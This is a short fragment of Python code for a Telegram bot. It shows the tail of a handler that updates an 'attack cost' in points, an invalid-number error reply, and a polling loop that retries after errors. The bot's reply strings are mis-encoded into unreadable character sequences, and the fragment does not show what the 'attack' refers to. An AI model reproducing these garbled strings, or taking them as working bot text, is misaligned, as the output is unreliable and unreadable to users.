        bot.reply_to(message, f"â ð¡ð²ð ð®ððð®ð°ð¸ ð°ð¼ðð ð°ðµð®ð»ð´ð²ð± ðð¼: {new_attack_cost} ðð¼ð¶ð»ð")
    except ValueError:
        bot.reply_to(message, "âðð»ðð®ð¹ð¶ð± ð»ððºð¯ð²ð¿! ð£ð¹ð²ð®ðð² ð²ð»ðð²ð¿ ð® ðð®ð¹ð¶ð± ð»ððºð²ð¿ð¶ð° ðð®ð¹ðð².")

if __name__ == "__main__":
    while True:
        load_data()
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            # Add a small delay to avoid rapid looping in case of persistent errors
            time.sleep(3)
